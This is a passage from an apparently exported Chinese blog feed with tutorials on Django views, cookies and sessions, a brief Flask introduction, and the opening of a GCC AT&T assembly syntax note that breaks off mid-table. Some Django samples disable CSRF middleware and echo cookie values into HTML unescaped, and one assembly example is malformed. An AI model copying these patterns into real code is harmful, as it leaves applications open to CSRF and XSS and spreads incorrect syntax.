<h2 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h2><h3 id="直接返回数据"><a href="#直接返回数据" class="headerlink" title="直接返回数据"></a>直接返回数据</h3><p>1）打开 <code>booktest/views.py</code> 文件，定义视图 <code>index2</code> 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def index2(request):</span><br><span class="line">    str=&#x27;&lt;h1&gt;hello world&lt;/h1&gt;&#x27;</span><br><span class="line">    return HttpResponse(str)</span><br></pre></td></tr></table></figure>

<p>2）打开 booktest&#x2F;urls.py 文件，配置 url。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^index2/$&#x27;,views.index2),</span><br></pre></td></tr></table></figure>

<p>3）运行服务器，在浏览器中打开如下网址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/index2/</span><br></pre></td></tr></table></figure>

<h3 id="调用模板"><a href="#调用模板" class="headerlink" title="调用模板"></a>调用模板</h3><p>可以将 html、css、js 定义到一个 html 文件中，然后由视图来调用。</p>
<p>1）打开 <code>booktest/views.py</code> 文件，定义视图 index3 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.template import RequestContext, loader</span><br><span class="line">...</span><br><span class="line">def index3(request):</span><br><span class="line">    #加载模板</span><br><span class="line">    t1=loader.get_template(&#x27;booktest/index3.html&#x27;)</span><br><span class="line">    #构造上下文</span><br><span class="line">    context=RequestContext(request,&#123;&#x27;h1&#x27;:&#x27;hello&#x27;&#125;)</span><br><span class="line">    #使用上下文渲染模板，生成字符串后返回响应对象</span><br><span class="line">    return HttpResponse(t1.render(context))</span><br></pre></td></tr></table></figure>

<p>2）打开 <code>booktest/urls.py</code> 文件，配置 url 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^index3/$&#x27;,views.index3),</span><br></pre></td></tr></table></figure>

<p>3）在 <code>templates/booktest/</code> 目录下创建 <code>index3.html</code> ，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;使用模板&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;&#123;&#123;h1&#125;&#125;&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>4）运行服务器，在浏览器中打开如下网址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/index3/</span><br></pre></td></tr></table></figure>

<h3 id="调用模板简写函数-render"><a href="#调用模板简写函数-render" class="headerlink" title="调用模板简写函数 render"></a>调用模板简写函数 render</h3><p>每次调用模板时都要执行加载、上下文、渲染三个步骤，为了简化操作， Django 定义了 <code>render()</code> 函数封装了以上三个步骤的代码，定义在 <code>django.shortcuts</code> 模块中。</p>
<p>1）打开 <code>booktest/views.py</code> 文件，定义视图 index3 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.shortcuts import render</span><br><span class="line">...</span><br><span class="line">def index3(request):</span><br><span class="line">    return render(request, &#x27;booktest/index3.html&#x27;, &#123;&#x27;h1&#x27;: &#x27;hello&#x27;&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="子类-JsonResponse"><a href="#子类-JsonResponse" class="headerlink" title="子类 JsonResponse"></a>子类 JsonResponse</h2><p>在浏览器中使用 javascript 发起 ajax 请求时，返回 json 格式的数据，此处以 jquery 的 get()方法为例。类 JsonResponse 继承自 HttpResponse 对象，被定义在 django.http 模块中，创建对象时接收字典作为参数。</p>
<blockquote>
<p>JsonResponse 对象的 content-type 为’application&#x2F;json’。</p>
</blockquote>
<h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h3><p>1）在 booktest&#x2F;views.py 文件中定义视图 json1、json2，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.http import JsonResponse</span><br><span class="line">...</span><br><span class="line">def json1(request):</span><br><span class="line">    return render(request,&#x27;booktest/json1.html&#x27;)</span><br><span class="line">def json2(request):</span><br><span class="line">    return JsonResponse(&#123;&#x27;h1&#x27;:&#x27;hello&#x27;,&#x27;h2&#x27;:&#x27;world&#x27;&#125;)</span><br></pre></td></tr></table></figure>

<p>2）在 booktest&#x2F;urls.py 文件中配置 url。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^json1/$&#x27;, views.json1),</span><br><span class="line">url(r&#x27;^json2/$&#x27;, views.json2),</span><br></pre></td></tr></table></figure>

<p>3）创建目录 static&#x2F;js&#x2F;，把 jquery 文件拷贝到这个目录下。</p>
<p>4）打开 test3&#x2F;settings.py 文件，在文件最底部，配置静态文件查找路径，并且要求开启调试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DEBUG = True</span><br><span class="line">...</span><br><span class="line">STATICFILES_DIRS = [</span><br><span class="line">    os.path.join(BASE_DIR, &#x27;static&#x27;),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>s 5）在 templates&#x2F;booktest&#x2F;目录下创建 json1.html，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;json&lt;/title&gt;</span><br><span class="line">    &lt;script src=&quot;/static/js/jquery-1.12.4.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        $(function () &#123;</span><br><span class="line">            $(&#x27;#btnJson&#x27;).click(function () &#123;</span><br><span class="line">                $.get(&#x27;/json2/&#x27;,function (data) &#123;</span><br><span class="line">                    ul=$(&#x27;#jsonList&#x27;);</span><br><span class="line">                    ul.append(&#x27;&lt;li&gt;&#x27;+data[&#x27;h1&#x27;]+&#x27;&lt;/li&gt;&#x27;)</span><br><span class="line">                    ul.append(&#x27;&lt;li&gt;&#x27;+data[&#x27;h2&#x27;]+&#x27;&lt;/li&gt;&#x27;)</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; id=&quot;btnJson&quot; value=&quot;获取json数据&quot;&gt;</span><br><span class="line">&lt;ul id=&quot;jsonList&quot;&gt;&lt;/ul&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>6）运行服务器，在浏览器中输入如下地址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/json1/</span><br></pre></td></tr></table></figure>

<p>7）点击按钮”获取 json 数据”后浏览如下图。</p>
<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-04-16-34-14.png" class="">

<h2 id="子类-HttpResponseRedirect"><a href="#子类-HttpResponseRedirect" class="headerlink" title="子类 HttpResponseRedirect"></a>子类 HttpResponseRedirect</h2><p>当一个逻辑处理完成后，不需要向客户端呈现数据，而是转回到其它页面，如添加成功、修改成功、删除成功后显示数据列表，而数据的列表视图已经开发完成，此时不需要重新编写列表的代码，而是转到这个视图就可以，此时就需要模拟一个用户请求的效果，从一个视图转到另外一个视图，就称为重定向。</p>
<p>Django 中提供了 HttpResponseRedirect 对象实现重定向功能，这个类继承自 HttpResponse，被定义在 django.http 模块中，返回的状态码为 302。</p>
<h3 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a>示例</h3><p>1）在 booktest&#x2F;views.py 文件中定义视图 red1，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.http import HttpResponseRedirect</span><br><span class="line">...</span><br><span class="line"># 定义重定义向视图，转向首页</span><br><span class="line">def red1(request):</span><br><span class="line">    return HttpResponseRedirect(&#x27;/&#x27;)</span><br></pre></td></tr></table></figure>

<p>2）在 booktest&#x2F;urls.py 文件中配置 url。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^red1/$&#x27;, views.red1),</span><br></pre></td></tr></table></figure>

<p>3）在地址栏中输入网址如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/red1/</span><br></pre></td></tr></table></figure>

<p>4）回车后，浏览器地址栏如下图。</p>
<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-04-16-42-09.png" class="">

<h3 id="重定向简写函数-redirect"><a href="#重定向简写函数-redirect" class="headerlink" title="重定向简写函数 redirect"></a>重定向简写函数 redirect</h3><p>在 django.shortcuts 模块中为重定向类提供了简写函数 redirect。</p>
<p>1）修改 booktest&#x2F;views.py 文件中 red1 视图，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.shortcuts import redirect</span><br><span class="line">...</span><br><span class="line">def red1(request):</span><br><span class="line">    return redirect(&#x27;/&#x27;)</span><br></pre></td></tr></table></figure>

<h1 id="状态保持"><a href="#状态保持" class="headerlink" title="状态保持"></a>状态保持</h1><p>浏览器请求服务器是无状态的。无状态指一次用户请求时，浏览器、服务器无法知道之前这个用户做过什么，每次请求都是一次新的请求。无状态的应用层面的原因是：浏览器和服务器之间的通信都遵守 HTTP 协议。根本原因是：浏览器与服务器是使用 Socket 套接字进行通信的，服务器将请求结果返回给浏览器之后，会关闭当前的 Socket 连接，而且服务器也会在处理页面完毕之后销毁页面对象。</p>
<p>有时需要保存下来用户浏览的状态，比如用户是否登录过，浏览过哪些商品等。 实现状态保持主要有两种方式：</p>
<ul>
<li>在客户端存储信息使用 Cookie。</li>
<li>在服务器端存储信息使用 Session。</li>
</ul>
<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>Cookie，有时也用其复数形式 Cookies ，指某些网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）。 Cookie 最早是网景公司的前雇员 Lou Montulli 在 1993 年 3 月的发明。Cookie 是由服务器端生成，发送给 <code>User-Agent</code>（一般是浏览器），浏览器会将 Cookie 的 <code>key/value</code> 保存到某个目录下的文本文件内，下次请求同一网站时就发送该 Cookie 给服务器（前提是浏览器设置为启用 cookie ）。Cookie 名称和值可以由服务器端开发自己定义，这样服务器可以知道该用户是否是合法用户以及是否需要重新登录等。服务器可以利用 Cookies 包含信息的任意性来筛选并经常性维护这些信息，以判断在 HTTP 传输中的状态。Cookies 最典型记住用户名。</p>
<p>Cookie 是存储在浏览器中的一段纯文本信息，建议不要存储敏感信息如密码，因为电脑上的浏览器可能被其它人使用。</p>
<h3 id="Cookie-的特点"><a href="#Cookie-的特点" class="headerlink" title="Cookie 的特点"></a>Cookie 的特点</h3><ul>
<li>Cookie 以键值对的格式进行信息的存储。</li>
<li>Cookie 基于域名安全，不同域名的 Cookie 是不能互相访问的，如访问 <code>google.com</code> 时向浏览器中写了 Cookie 信息，使用同一浏览器访问 <code>baidu.com</code> 时，无法访问到 <code>google.com</code> 写的 Cookie 信息。</li>
<li>当浏览器请求某网站时，会将浏览器存储的跟网站相关的所有 Cookie 信息提交给网站服务器。</li>
</ul>
<h3 id="设置-Cookie"><a href="#设置-Cookie" class="headerlink" title="设置 Cookie"></a>设置 Cookie</h3><p>1）打开 booktest&#x2F;views.py 文件，创建视图 cookie_set。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def cookie_set(request):</span><br><span class="line">    response = HttpResponse(&quot;&lt;h1&gt;设置Cooki&lt;/h1&gt;&quot;)</span><br><span class="line">    response.set_cookie(&#x27;h1&#x27;, &#x27;hellworld&#x27;)</span><br><span class="line">    return response</span><br></pre></td></tr></table></figure>

<p>2）打开 booktest&#x2F;urls.py 文件，配置 url。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^cookie_set/$&#x27;,views.cookie_set),</span><br></pre></td></tr></table></figure>

<p>3）在浏览器输入如下网址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/cookie_set/</span><br></pre></td></tr></table></figure>

<p>在”开发者工具”中可以在响应头中查看到设置的 Cookie 信息。</p>
<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-04-17-01-45.png" class="">

<h3 id="读取-Cookie"><a href="#读取-Cookie" class="headerlink" title="读取 Cookie"></a>读取 Cookie</h3><p>Cookie 信息被包含在请求头中，使用 request 对象的 COOKIES 属性访问。</p>
<p>1）打开 booktest&#x2F;views.py 文件，创建视图 cookie_get。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def cookie_get(request):</span><br><span class="line">    response = HttpResponse(&quot;读取Cookie，数据如下：&lt;br&gt;&quot;)</span><br><span class="line">    if &#x27;h1&#x27; in request.COOKIES:</span><br><span class="line">        response.write(&#x27;&lt;h1&gt;&#x27; + request.COOKIES[&#x27;h1&#x27;] + &#x27;&lt;/h1&gt;&#x27;)</span><br><span class="line">    return response</span><br></pre></td></tr></table></figure>

<p>2）打开 booktest&#x2F;urls.py 文件，配置 url。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^cookie_get/$&#x27;,views.cookie_get),</span><br></pre></td></tr></table></figure>

<p>3）在浏览器输入如下网址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/cookie_get/</span><br></pre></td></tr></table></figure>

<p>4）打开“开发者工具”，在请求头中可以查看 Cookie 信息，浏览效果如下图：</p>
<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-04-17-06-43.png" class="">

<h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><p>对于敏感、重要的信息，建议要储在服务器端，不能存储在浏览器中，如用户名、余额、等级、验证码等信息。</p>
<blockquote>
<p>在服务器端进行状态保持的方案就是 Session。</p>
</blockquote>
<h3 id="启用-Session"><a href="#启用-Session" class="headerlink" title="启用 Session"></a>启用 Session</h3><p>Django 项目默认启用 Session。</p>
<p>打开 <code>test3/settings.py</code> 文件，在项 MIDDLEWARE_CLASSES 中启用 Session 中间件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MIDDLEWARE_CLASSES = (</span><br><span class="line">    &#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;,#默认启动</span><br><span class="line">    &#x27;django.middleware.common.CommonMiddleware&#x27;,</span><br><span class="line">     #&#x27;django.middleware.csrf.CsrfViewMiddleware&#x27;,</span><br><span class="line">    &#x27;django.contrib.auth.middleware.AuthenticationMiddleware&#x27;,</span><br><span class="line">    &#x27;django.contrib.auth.middleware.SessionAuthenticationMiddleware&#x27;,</span><br><span class="line">    &#x27;django.contrib.messages.middleware.MessageMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.clickjacking.XFrameOptionsMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.security.SecurityMiddleware&#x27;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>禁用 Session：将 Session 中间件删除。</p>
<h3 id="存储方式"><a href="#存储方式" class="headerlink" title="存储方式"></a>存储方式</h3><p>打开 <code>test3/settings.py</code> 文件，设置 SESSION_ENGINE 项指定 Session 数据存储的方式，可以存储在数据库、缓存、Redis 等。</p>
<p>1）存储在数据库中，如下设置可以写，也可以不写，这是默认存储方式。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SESSION_ENGINE=&#x27;django.contrib.sessions.backends.db&#x27;</span><br></pre></td></tr></table></figure>

<p>2）存储在缓存中：存储在本机内存中，如果丢失则不能找回，比数据库的方式读写更快。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SESSION_ENGINE=&#x27;django.contrib.sessions.backends.cache&#x27;</span><br></pre></td></tr></table></figure>

<p>3）混合存储：优先从本机内存中存取，如果没有则从数据库中存取。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SESSION_ENGINE=&#x27;django.contrib.sessions.backends.cached_db&#x27;</span><br></pre></td></tr></table></figure>

<p>4）如果存储在数据库中，需要在项 INSTALLED_APPS 中安装 Session 应用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = (</span><br><span class="line">    &#x27;django.contrib.admin&#x27;,</span><br><span class="line">    &#x27;django.contrib.auth&#x27;,</span><br><span class="line">    &#x27;django.contrib.contenttypes&#x27;,</span><br><span class="line">    &#x27;django.contrib.sessions&#x27;, # 如果sessions存储在数据库中，则需要安装该应用</span><br><span class="line">    &#x27;django.contrib.messages&#x27;,</span><br><span class="line">    &#x27;django.contrib.staticfiles&#x27;,</span><br><span class="line">    &#x27;booktest&#x27;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>5）迁移后会在数据库中创建出存储 Session 的表。</p>
<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-04-17-14-33.png" class="">

<p>6）表结构如下图。</p>
<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-04-17-15-45.png" class="">

<blockquote>
<p>由表结构可知，操作 Session 包括三个数据：键，值，过期时间。</p>
</blockquote>
<h3 id="依赖于-Cookie"><a href="#依赖于-Cookie" class="headerlink" title="依赖于 Cookie"></a>依赖于 Cookie</h3><p>所有请求者的 Session 都会存储在服务器中，服务器如何区分请求者和 Session 数据的对应关系呢？</p>
<p>答：在使用 Session 后，会在 Cookie 中存储一个 sessionid 的数据，每次请求时浏览器都会将这个数据发给服务器，服务器在接收到 sessionid 后，会根据这个值找出这个请求者的 Session。</p>
<p>结果：如果想使用 Session，浏览器必须支持 Cookie，否则就无法使用 Session 了。</p>
<p>存储 Session 时，键与 Cookie 中的 sessionid 相同，值是开发人员设置的键值对信息，进行了 base64 编码，过期时间由开发人员设置。</p>
<h3 id="对象及方法"><a href="#对象及方法" class="headerlink" title="对象及方法"></a>对象及方法</h3><p>通过 HttpRequest 对象的 session 属性进行会话的读写操作。</p>
<p>1） 以键值对的格式写 session。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">request.session[&#x27;键&#x27;]=值</span><br></pre></td></tr></table></figure>

<p>2）根据键读取值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">request.session.get(&#x27;键&#x27;,默认值)</span><br></pre></td></tr></table></figure>

<p>3）清除所有 session，在存储中删除值部分。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">request.session.clear()</span><br></pre></td></tr></table></figure>

<p>4）清除 session 数据，在存储中删除 session 的整条数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">request.session.flush()</span><br></pre></td></tr></table></figure>

<p>5）删除 session 中的指定键及值，在存储中只删除某个键及对应的值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">del request.session[&#x27;键&#x27;]</span><br></pre></td></tr></table></figure>

<p>6）设置会话的超时时间，如果没有指定过期时间则两个星期后过期。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">request.session.set_expiry(value)</span><br></pre></td></tr></table></figure>

<ul>
<li>如果 value 是一个整数，会话将在 value 秒没有活动后过期。</li>
<li>如果 value 为 0，那么用户会话的 Cookie 将在用户的浏览器关闭时过期。</li>
<li>如果 value 为 None，那么会话永不过期。</li>
</ul>
<h3 id="示例-5"><a href="#示例-5" class="headerlink" title="示例"></a>示例</h3><h4 id="写-session"><a href="#写-session" class="headerlink" title="写 session"></a>写 session</h4><p>1）打开 <code>booktest/views.py</code> 文件，创建视图 session_test ，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def session_test(request):</span><br><span class="line">    request.session[&#x27;h1&#x27;] = &#x27;hello django&#x27;</span><br><span class="line">    return HttpResponse(&quot;写 Session&quot;)</span><br></pre></td></tr></table></figure>

<p>2）打开 <code>booktest/urls.py</code> 文件，配置 url 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^session_test/$&#x27;,views.session_test),</span><br></pre></td></tr></table></figure>

<p>3）运行服务器，打开浏览器请求如下网址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/session_test/</span><br></pre></td></tr></table></figure>

<p>4）浏览效果如下图，在”开发者工具”中可以查看到响应头中创建了 Cookie ，里面有个键为 sessionid 。</p>


<p>5）打开 MySQL 数据库命令行，查询数据如下图。</p>
<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-04-20-26-26.png" class="">

<p>查看 Cookie 中的 sessionid 值为 <code>v5w6h9k1b12kfkncvjmqa0yj2x5egt0h</code> ，数据表中 session 的键为 <code>v5w6h9k1b12kfkncvjmqa0yj2x5egt0h</code> ，是一样的，这样，服务器就可以在众多的请求者中找到对应的 Session 数据。</p>
<p>在 MySQL 数据库命令行中复制值，在 Base64 解码中进行解码查看如下图。</p>
<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-04-20-32-08.png" class="">

<h4 id="读-session"><a href="#读-session" class="headerlink" title="读 session"></a>读 session</h4><p>1）打开 <code>booktest/views.py</code> 文件，添加 session_read 视图如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def session_read(request):</span><br><span class="line">    h1 = request.session.get(&quot;h1&quot;)</span><br><span class="line">    return HttpResponse(h1)</span><br></pre></td></tr></table></figure>

<p>2）刷新浏览器效果如下图。</p>
<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-04-20-37-08.png" class="">

<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><p>1）打开 <code>booktest/views.py</code> 文件，添加 session_del 视图如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def session_del(request):</span><br><span class="line">    del request.session[&quot;h1&quot;]</span><br><span class="line">    return HttpResponse(&quot;del OK&quot;)</span><br></pre></td></tr></table></figure>

<p>2）刷新浏览器，在数据库命令行中查询，base64 解码后如下图。</p>
<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-04-20-39-46.png" class="">

<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-04-20-40-21.png" class="">

<p>如果将所有的键及值都删除，逐个调用 del 太麻烦，可以使用 clear()方法。</p>
<h4 id="删除-session"><a href="#删除-session" class="headerlink" title="删除 session"></a>删除 session</h4><p>1）打开 <code>booktest/views.py</code> 文件，添加 del_session 视图如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def del_session(request):</span><br><span class="line">    request.session.flush()</span><br><span class="line">    return HttpResponse(&quot;Del session OK&quot;)</span><br></pre></td></tr></table></figure>

<p>2）刷新浏览器，在数据库命令行中查询如下图。</p>
<img src="/2019/12/27/Django%E5%AD%A6%E4%B9%A0-%E8%A7%86%E5%9B%BE/2020-01-04-20-44-49.png" class="">
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask简单学习</title>
    <url>/2020/01/29/Flask%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>由于是学习，所以直接在django的虚拟环境中安装Flask。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指定Flask版本安装</span><br><span class="line">$ pip install flask==0.10.1</span><br></pre></td></tr></table></figure>

<h1 id="从-Hello-World-开始"><a href="#从-Hello-World-开始" class="headerlink" title="从 Hello World 开始"></a>从 Hello World 开始</h1><h2 id="Flask程序运行过程："><a href="#Flask程序运行过程：" class="headerlink" title="Flask程序运行过程："></a>Flask程序运行过程：</h2><p>所有Flask程序必须有一个程序实例。</p>
<p>Flask调用视图函数后，会将视图函数的返回值作为响应的内容，返回给客户端。一般情况下，响应内容主要是字符串和状态码。</p>
<p>当客户端想要获取资源时，一般会通过浏览器发起HTTP请求。此时，Web服务器使用WSGI（Web Server Gateway Interface）协议，把来自客户端的所有请求都交给Flask程序实例。WSGI是为 Python 语言定义的Web服务器和Web应用程序之间的一种简单而通用的接口，它封装了接受HTTP请求、解析HTTP请求、发送HTTP，响应等等的这些底层的代码和操作，使开发者可以高效的编写Web应用。</p>
<p>程序实例使用Werkzeug来做路由分发（URL请求和视图函数之间的对应关系）。根据每个URL请求，找到具体的视图函数。 在Flask程序中，路由的实现一般是通过程序实例的route装饰器实现。route装饰器内部会调用add_url_route()方法实现路由注册。</p>
<p>调用视图函数，获取响应数据后，把数据传入HTML模板文件中，模板引擎负责渲染响应数据，然后由Flask返回响应数据给浏览器，最后浏览器处理返回的结果显示给客户端。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>GCC内联汇编</title>
    <url>/2021/06/14/GCC%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/</url>
    <content><![CDATA[<blockquote>
<p>本文主要参考 <a href="https://www.linuxprobe.com/gcc-how-to.html">https://www.linuxprobe.com/gcc-how-to.html</a></p>
</blockquote>
<h1 id="GCC-汇编语法"><a href="#GCC-汇编语法" class="headerlink" title="GCC 汇编语法"></a>GCC 汇编语法</h1><p><code>Linux</code> 上的 <code>GNU C</code> 编译器 <code>GCC</code> ，使用 <code>AT&amp;T/UNIX</code> 汇编语法。在这里，我们将使用 <code>AT&amp;T</code> 语法 进行汇编编码。<code>AT&amp;T</code> 语法和 <code>Intel</code> 语法的差别很大。</p>
<h2 id="源操作数和目的操作数顺序"><a href="#源操作数和目的操作数顺序" class="headerlink" title="源操作数和目的操作数顺序"></a>源操作数和目的操作数顺序</h2><p><code>AT&amp;T</code> 语法的操作数方向和 <code>Intel</code> 语法的刚好相反。</p>
<ul>
<li><p>在 <code>Intel</code> 语法中，第一操作数为目的操作数，第二操作数为源操作数。</p>
</li>
<li><p>在 <code>AT&amp;T</code>  语法中，第一操作数为源操作数，第二操作数为目的操作数。</p>
</li>
</ul>
<h2 id="寄存器命名"><a href="#寄存器命名" class="headerlink" title="寄存器命名"></a>寄存器命名</h2><p><code>AT&amp;T</code> 语法寄存器名称有 <code>%</code> 前缀，即如果必须使用 <code>eax</code>，它应该用作 <code>%eax</code> 。</p>
<h2 id="立即数"><a href="#立即数" class="headerlink" title="立即数"></a>立即数</h2><p><code>AT&amp;T</code> 语法立即数以 <code>$</code> 为前缀。静态 <code>C</code> 变量也使用 <code>$</code> 前缀。在 <code>Intel</code> 语法中，十六进制常量以 <code>h</code> 为后缀，然而 <code>AT&amp;T</code> 不使用这种语法，这里我们给常量添加前缀 <code>0x</code>。所以，对于十六进制，我们首先看到一个 <code>$</code>，然后是 <code>0x</code>，最后才是常量。</p>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movl %ecx, $label(%edx,%ebx,$0x4)</span><br></pre></td></tr></table></figure>

<h2 id="操作数大小"><a href="#操作数大小" class="headerlink" title="操作数大小"></a>操作数大小</h2><p>在 <code>AT&amp;T</code> 语法中，存储器操作数的大小取决于操作码名字的最后一个字符。操作码后缀 <code>b</code> 、<code>w</code> 、<code>l</code> 分别指明了字节（8位）、字（16位）、长型（32位）存储器引用。</p>
<p><code>Intel</code>  语法通过给存储器操作数添加 <code>byte ptr</code>、 <code>word ptr</code> 和 <code>dword ptr</code> 前缀来实现这一功能。</p>
<p>因此，<code>Intel</code> 的 <code>mov al, byte ptr foo</code> 在 <code>AT&amp;T</code> 语法中为 <code>movb foo, %al</code>。</p>
<h2 id="存储器操作数"><a href="#存储器操作数" class="headerlink" title="存储器操作数"></a>存储器操作数</h2><p>在 <code>Intel</code> 语法中，基址寄存器包含在 <code>[</code> 和 <code>]</code> 中，然而在 <code>AT&amp;T</code> 中，它们变为 <code>(</code> 和 <code>)</code>。</p>
<p>另外，在 <code>Intel</code> 语法中， 间接内存引用为 <code>section:[base + index*scale + disp]</code>，在 <code>AT&amp;T</code> 中变为 <code>section:disp(base, index, scale)</code>。</p>
<p>需要牢记的一点是，当一个常量用于 <code>disp</code> 或 <code>scale</code> ，不能添加 <code>$</code> 前缀。</p>
<p>现在我们看到了 <code>Intel</code> 语法和 <code>AT&amp;T</code> 语法之间的一些主要差别。我仅仅写了它们差别的一部分而已。关于更完整的信息，请参考 <code>GNU</code> 汇编文档。现在为了更好地理解，我们可以看一些示例。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+------------------------------+------------------------------------+</span><br><span class="line">|       Intel Code             |      AT&amp;T Code                     |</span><br><span class="line">+------------------------------+------------------------------------+</span><br><span class="line">| mov     eax,1                |  movl    $1,%eax                   |</span><br><span class="line">| mov     ebx,0ffh             |  movl    $0xff,%ebx                |</span><br><span class="line">| int     80h                  |  int     $0x80                     |</span><br><span class="line">| mov     ebx, eax             |  movl    %eax, %ebx                |</span><br><span class="line">| mov     eax,[ecx]            |  movl    (%ecx),%eax               |</span><br><span class="line">| mov     